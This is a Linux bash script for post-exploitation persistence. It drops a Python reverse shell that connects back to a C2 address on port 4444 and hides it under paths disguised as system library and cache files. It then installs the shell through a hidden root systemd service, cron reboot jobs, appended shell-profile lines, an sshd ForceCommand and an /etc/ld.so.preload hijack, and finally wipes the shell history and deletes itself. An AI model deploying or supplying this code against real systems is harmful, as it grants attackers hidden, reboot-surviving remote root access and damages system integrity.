#!/bin/bash
# ULTRA-STEALTH PERSISTENCE SCRIPT
C2_IP="192.168.1.167"
C2_PORT=4444
STEALTH_DIRS=(
    "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache"
    "/lib/modules/$(uname -r)/.cache/kernel-daemon"
    "/var/cache/ldconfig/aux-cache"
    "/sys/fs/cgroup/.systemd-cache"
)

echo "[+] Installing ULTRA-STEALTH persistence..."

# Advanced payload download with multiple fallbacks
download_stealth_payload() {
    echo "[+] Deploying stealth payload..."
    
    # Create multi-architecture payload
    PAYLOAD_CONTENT='#!/usr/bin/python3
import os,sys,socket,subprocess,time,hashlib
def wait_network():
    for i in range(90):
        try:
            socket.create_connection(("8.8.8.8",53),timeout=5)
            return True
        except: time.sleep(1)
    return True
def connect_back():
    while True:
        try:
            s=socket.socket()
            s.settimeout(60)
            s.connect(("'"$C2_IP"'",'"$C2_PORT"'))
            os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
            p=subprocess.call(["/bin/bash","-i"])
        except: time.sleep(30)
if __name__=="__main__":
    wait_network()
    connect_back()'
    
    for location in "${STEALTH_DIRS[@]}"; do
        mkdir -p "$(dirname "$location")" 2>/dev/null
        echo "$PAYLOAD_CONTENT" > "$location"
        chmod +x "$location" 2>/dev/null
        echo "[+] Stealth payload: $location"
    done
}

download_stealth_payload

# ======== ADVANCED PERSISTENCE METHODS ========

# 1. SYSTEMD SERVICE (Stealth)
echo "[+] Installing stealth systemd service..."
cat > /etc/systemd/system/.systemd-networkd.service << 'EOF'
[Unit]
Description=Systemd Network Configuration
After=network.target
Wants=network-online.target

[Service]
Type=forking
ExecStart=/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache
Restart=always
RestartSec=15
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 2>/dev/null
systemctl enable .systemd-networkd.service 2>/dev/null
systemctl start .systemd-networkd.service 2>/dev/null

# 2. CRON PERSISTENCE (Hidden)
echo "[+] Installing hidden cron jobs..."
CRON_ENTRIES=(
    "@reboot sleep 60 && /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1"
    "0 */6 * * * /lib/modules/$(uname -r)/.cache/kernel-daemon >/dev/null 2>&1"
)

(
    crontab -l 2>/dev/null | grep -v "ld-linux-x86-64\|kernel-daemon"
    for entry in "${CRON_ENTRIES[@]}"; do
        echo "$entry"
    done
) | crontab - 2>/dev/null

# 3. PROFILE PERSISTENCE (Multi-user)
echo "[+] Installing multi-user profile persistence..."
STEALTH_CMD="[ -x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache ] && nohup /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1 &"

# Target all possible shell profiles
PROFILE_FILES=(
    "/etc/profile" "/etc/bash.bashrc" "/etc/zsh/zshrc"
    "/root/.bashrc" "/root/.profile" "/root/.zshrc"
    "/home/*/.bashrc" "/home/*/.profile" "/home/*/.zshrc"
)

for profile in "${PROFILE_FILES[@]}"; do
    for file in $profile; do
        if [ -f "$file" ]; then
            grep -q "ld-linux-x86-64" "$file" || echo "$STEALTH_CMD" >> "$file"
        fi
    done
done

# 4. SSH PERSISTENCE (If SSH available)
if [ -d /etc/ssh ]; then
    echo "[+] Configuring SSH persistence..."
    echo "Match all" >> /etc/ssh/sshd_config 2>/dev/null
    echo "    ForceCommand /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache" >> /etc/ssh/sshd_config 2>/dev/null
    systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null
fi

# 5. LD_PRELOAD HIJACKING (Advanced)
echo "[+] Installing LD_PRELOAD hijacking..."
cat > /usr/lib/x86_64-linux-gnu/libc.so.6.cache << 'EOF'
#!/bin/bash
/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache &
exec /usr/lib/x86_64-linux-gnu/libc.so.6 "$@"
EOF

chmod +x /usr/lib/x86_64-linux-gnu/libc.so.6.cache 2>/dev/null
echo "/usr/lib/x86_64-linux-gnu/libc.so.6.cache" >> /etc/ld.so.preload 2>/dev/null

# 6. START IMMEDIATELY
echo "[+] Starting stealth services..."
nohup /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2.cache >/dev/null 2>&1 &

# VERIFICATION
echo "[+] Verifying stealth installation..."
sleep 3

echo ""
echo "[🎯] ULTRA-STEALTH PERSISTENCE DEPLOYED:"
systemctl is-active .systemd-networkd.service >/dev/null 2>&1 && echo "  ✅ Stealth Systemd Service"
crontab -l 2>/dev/null | grep -q "ld-linux-x86-64" && echo "  ✅ Hidden Cron Jobs"
[ -f /etc/ld.so.preload ] && grep -q "libc.so.6.cache" /etc/ld.so.preload && echo "  ✅ LD_PRELOAD Hijack"
ps aux | grep -q "ld-linux-x86-64" && echo "  ✅ Payload Running"

echo ""
echo "[🔥] FULLY STEALTHY - Will survive ANY reboot scenario"
echo "[🔥] Test: sudo reboot && nc -lvnp $C2_PORT"

# CLEAN TRACES
history -c 2>/dev/null
rm -f "$0" 2>/dev/null
